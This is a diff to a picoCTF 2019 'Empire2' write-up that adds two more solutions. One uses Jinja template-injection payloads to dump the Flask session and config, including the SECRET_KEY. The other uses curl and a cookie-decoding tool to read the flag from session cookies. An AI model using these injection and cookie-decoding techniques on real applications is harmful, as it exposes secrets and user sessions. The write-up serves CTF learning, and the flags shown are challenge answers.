@@ -93,7 +93,7 @@ class MyPrompt(Cmd):
 MyPrompt().cmdloop()
 ```
 
-Since direct access to the Python built-ins is blocked, we'll build our way up using the same technique that worked in last year's [Flaskcards](/2018_picoCTF/Flaskcards.md)
+Since direct access to the Python built-ins is blocked, we'll build our way up using the same technique that worked in last year's [Flaskcards](/2018_picoCTF/Flaskcards.md).
 
 Session:
 ```console
@@ -247,3 +247,84 @@ class Todo(db.Model):
 ```
 
 We can see that the flag is located in the source of `models.py`: `picoCTF{its_a_me_your_flag5c0e0ae8}`. Since it is inserted into the DB, this might be an unintended solution.
+
+## Additional Solutions
+
+Two more ways to solve the challenge, based on other writeups:
+
+#### Session
+
+The flag is in the user session ([source](https://github.com/roothuntervn/CTF-Writeup/blob/e85042ca05eede0591841c8da6e3f4af2f0b47a3/picoCTF-2019/Web/empire-2/README.md)):
+
+```console
+root@kali:/media/sf_CTFs/pico/Empire2# python shell.py
+Logged in
+(Cmd) send session
+Sending: '{{session}}'
+
+<SecureCookieSession {'_fresh': True, '_id': '3898c6835dcd0270702e6730af6bfe5706c798e5239b48c704db909659fbfba4610afd8be05b0a827eda02cb65fe7dc75a2f84325654bddbbbc922a3c5e4f79d', 'csrf_token': '4eff1dd062289b5e4144c3a136d6516ac2430ad9', 'dark_secret': 'picoCTF{its_a_me_your_flag5c0e0ae8}', 'user_id': '3'}>
+
+(Cmd)
+```
+
+#### Flask Cookie
+
+We can decode the cookie with the secret key ([source](http://cyberchallenge.unica.it/index.php/2019/10/13/web-empire2/)). This is probably the intended solution.
+
+We dump the config:
+
+```console
+root@kali:/media/sf_CTFs/pico/Empire2# python shell.py
+Logged in
+(Cmd) send config
+Sending: '{{config}}'
+
+<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'picoCTF{your_flag_is_in_another_castle12345678}', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite://', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}, 'BOOTSTRAP_USE_MINIFIED': True, 'BOOTSTRAP_CDN_FORCE_SSL': False, 'BOOTSTRAP_QUERYSTRING_REVVING': True, 'BOOTSTRAP_SERVE_LOCAL': False, 'BOOTSTRAP_LOCAL_SUBDOMAIN': None}>
+```
+
+The secret key is:
+```
+'SECRET_KEY': 'picoCTF{your_flag_is_in_another_castle12345678}'
+```
+
+Now we fetch the cookie:
+
+```console
+root@kali:/media/sf_CTFs/pico/Empire2# curl "https://2019shell1.picoctf.com/problem/13253/login" --cookie "cookies.txt" --cookie-jar "cookies.txt" -s -v --data "csrf_token=$(curl "https://2019shell1.picoctf.com/problem/13253/login" --cookie "cookies.txt" --cookie-jar "cookies.txt" -s | grep csrf | awk '{ printf $5 }' | sed 's/value="//g' | sed 's/">//')&username=user&password=password" 2>&1 | grep Cookie
+> Cookie: session=eyJfZnJlc2giOmZhbHNlLCJjc3JmX3Rva2VuIjoiZDU1MzkwODhkZGNhY2Y4NmZmZDYzYjJlNWIyZTJkMWVhOGM3YjUxNiJ9.XaWvuQ.O3jA4KKsTj0ZUrOcDxKxY29EIng
+< Vary: Cookie
+< Set-Cookie: session=.eJwljzlqA0EUBe_SsYJe_qrLiP4bNgYbZqTI-O4acPDCour9tkcdeX60-_N45a09PqPdm0KV7kWJyMEbnDNCycmhVKX3jh25g1lZmuCetFXZcuiMwQTTRPrwpZGFq88xEFYIb9YSJQAunZgbFJzQISZOBzaiUWC73ZqfRz2eP1_5ffUE4tIuEuHbS6gqaNlMvHYJc4uz4aCLe515_J9Y7e8NdkY-9w.XaWvvA.J1ZL5OMpkoGhBUIwKwNMh0Qxj_w; HttpOnly; Path=/
+```
+
+And try to decode it with [flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager):
+
+```console
+root@kali:/media/sf_CTFs/pico/Empire2# c=.eJwljzlqA0EUBe_SsYJe_qrLiP4bNgYbZqTI-O4acPDCour9tkcdeX60-_N45a09PqPdm0KV7kWJyMEbnDNCycmhVKX3jh25g1lZmuCetFXZcuiMwQTTRPrwpZGFq88xEFYIb9YSJQAunZgbFJzQISZOBzaiUWC73ZqfRz2eP1_5ffUE4tIuEuHbS6gqaNlMvHYJc4uz4aCLe515_J9Y7e8NdkY-9w.XaWvvA.J1ZL5OMpkoGhBUIwKwNMh0Qxj_w
+root@kali:/media/sf_CTFs/pico/Empire2# python ~/utils/flask-session-cookie-manager/flask_session_cookie_manager2.py decode -s 'picoCTF{your_flag_is_in_another_castle12345678}' -c "$c"
+{u'csrf_token': u'd5539088ddcacf86ffd63b2e5b2e2d1ea8c7b516', u'_fresh': True, u'user_id': u'3', u'_id': u'94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba'}
+```
+
+No flag yet. We try to add an item and then decode the new cookie:
+```console
+root@kali:/media/sf_CTFs/pico/Empire2# curl "https://2019shell1.picoctf.com/problem/13253/add_item" --cookie "cookies.txt" --cookie-jar "cookies.txt" -s -v --data "csrf_token=$(curl "https://2019shell1.picoctf.com/problem/13253/add_item" --cookie "cookies.txt" --cookie-jar "cookies.txt" -s | grep csrf | awk '{ printf $5 }' | sed 's/value="//g' | sed 's/">//')&item=test" 2>&1 | grep Cookie
+> Cookie: session=.eJwljzlqA0EUBe_SsYJe_qrLiP4bNgYbZqTI-O4acPDCour9tkcdeX60-_N45a09PqPdm0KV7kWJyMEbnDNCycmhVKX3jh25g1lZmuCetFXZcuiMwQTTRPrwpZGFq88xEFYIb9YSJQAunZgbFJzQISZOBzaiUWC73ZqfRz2eP1_5ffUE4tIuEuHbS6gqaNlMvHYJc4uz4aCLe515_J9Y7e8NdkY-9w.XaWvvA.J1ZL5OMpkoGhBUIwKwNMh0Qxj_w
+< Vary: Cookie
+< Set-Cookie: session=.eJwlT0tqQzEQu0rwOgt_Zsae7LrsGUoI9nya0iaF55dVyN1r6EIIgYSkZ7j4T59Xm-H08QyHfVG42Zz908IxvO92O7ypmobz63xc5s3mNZz27WFLfWk4BQZ37oUMsWrtINVUmYQEnLnFGDFijTCGDxsNe6bOXIclzpoqQR6txSSF1RxLzCkhFG21V_bGBFCdM1oHBiEU0IxZoA6i5DD6milz88v--233tUcRC8fWVKWLN3JXKiMbLqxC603qwEQr95i2_Z8o4fUHY_tNeg.XaWweA.GMksoJhXdbLCFk4pNRiOwzFa-J8; HttpOnly; Path=/
+root@kali:/media/sf_CTFs/pico/Empire2# c=.eJwlT0tqQzEQu0rwOgt_Zsae7LrsGUoI9nya0iaF55dVyN1r6EIIgYSkZ7j4T59Xm-H08QyHfVG42Zz908IxvO92O7ypmobz63xc5s3mNZz27WFLfWk4BQZ37oUMsWrtINVUmYQEnLnFGDFijTCGDxsNe6bOXIclzpoqQR6txSSF1RxLzCkhFG21V_bGBFCdM1oHBiEU0IxZoA6i5DD6milz88v--233tUcRC8fWVKWLN3JXKiMbLqxC603qwEQr95i2_Z8o4fUHY_tNeg.XaWweA.GMksoJhXdbLCFk4pNRiOwzFa-J8
+root@kali:/media/sf_CTFs/pico/Empire2# python ~/utils/flask-session-cookie-manager/flask_session_cookie_manager2.py decode -s 'picoCTF{your_flag_is_in_another_castle12345678}' -c "$c"
+{u'_id': u'94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba', u'_fresh': True, u'user_id': u'3', u'csrf_token': u'd5539088ddcacf86ffd63b2e5b2e2d1ea8c7b516', u'_flashes': [(u'message', u'Item Added')]}
+```
+
+No cookie yet. Maybe we need to list the items?
+
+```console
+root@kali:/media/sf_CTFs/pico/Empire2# curl "https://2019shell1.picoctf.com/problem/13253/list_items" --cookie "cookies.txt" --cookie-jar "cookies.txt" -s -v 2>&1 | grep Cookie
+> Cookie: session=.eJwlT0tqQzEQu0rwOgt_Zsae7LrsGUoI9nya0iaF55dVyN1r6EIIgYSkZ7j4T59Xm-H08QyHfVG42Zz908IxvO92O7ypmobz63xc5s3mNZz27WFLfWk4BQZ37oUMsWrtINVUmYQEnLnFGDFijTCGDxsNe6bOXIclzpoqQR6txSSF1RxLzCkhFG21V_bGBFCdM1oHBiEU0IxZoA6i5DD6milz88v--233tUcRC8fWVKWLN3JXKiMbLqxC603qwEQr95i2_Z8o4fUHY_tNeg.XaWweA.GMksoJhXdbLCFk4pNRiOwzFa-J8
+< Vary: Cookie
+< Set-Cookie: session=.eJwlkL1qQzEMhV8leM7gP9lWtlIodO9WwkWW5CQkaYp9M5SQd69LB3EQnA-do4dZ2oXGUYfZfT7MZp1irjoGHdRszfuq182LiIrZP_fbae46jma39rvO7SRmZzC2hhSSAmTJFDmrCCZOHBtisdaChWxjra1qLUA-EWKu6tCLyyn6Wop1HFC0QbDeOYhBSqaMrWCKMTf0oBQxcgKO4sFzzDUl12KlGZNHb8t6O-vXzCMAAW0pIkzcSmpNUqheYc48qFQ4V3BpckL9vAzlrrO3-T7x7fXj7XFax0LLVZef273_vecAbNWSludk7kP7f_Fgnr8_qWAy.XaWwzw.3uQye2Z-VwJiYXfe6SBN2DGivGU; HttpOnly; Path=/
+root@kali:/media/sf_CTFs/pico/Empire2# c=.eJwlkL1qQzEMhV8leM7gP9lWtlIodO9WwkWW5CQkaYp9M5SQd69LB3EQnA-do4dZ2oXGUYfZfT7MZp1irjoGHdRszfuq182LiIrZP_fbae46jma39rvO7SRmZzC2hhSSAmTJFDmrCCZOHBtisdaChWxjra1qLUA-EWKu6tCLyyn6Wop1HFC0QbDeOYhBSqaMrWCKMTf0oBQxcgKO4sFzzDUl12KlGZNHb8t6O-vXzCMAAW0pIkzcSmpNUqheYc48qFQ4V3BpckL9vAzlrrO3-T7x7fXj7XFax0LLVZef273_vecAbNWSludk7kP7f_Fgnr8_qWAy.XaWwzw.3uQye2Z-VwJiYXfe6SBN2DGivGU
+root@kali:/media/sf_CTFs/pico/Empire2# python ~/utils/flask-session-cookie-manager/flask_session_cookie_manager2.py decode -s 'picoCTF{your_flag_is_in_another_castle12345678}' -c "$c"
+{u'csrf_token': u'd5539088ddcacf86ffd63b2e5b2e2d1ea8c7b516', u'user_id': u'3', u'_flashes': [(u'message', u'Item Added')], u'_fresh': True, u'dark_secret': u'picoCTF{its_a_me_your_flag5c0e0ae8}', u'_id': u'94ff9a36e557d7a4c7edd96c6c4f998000505704bbfbeb85a26a997be192d17642b8801c39def530211543d87a79f896447f925ea494c65c4d252c47b661f4ba'}
+```
+
+We can finally see the flag using this method. Template injection was much easier :-)
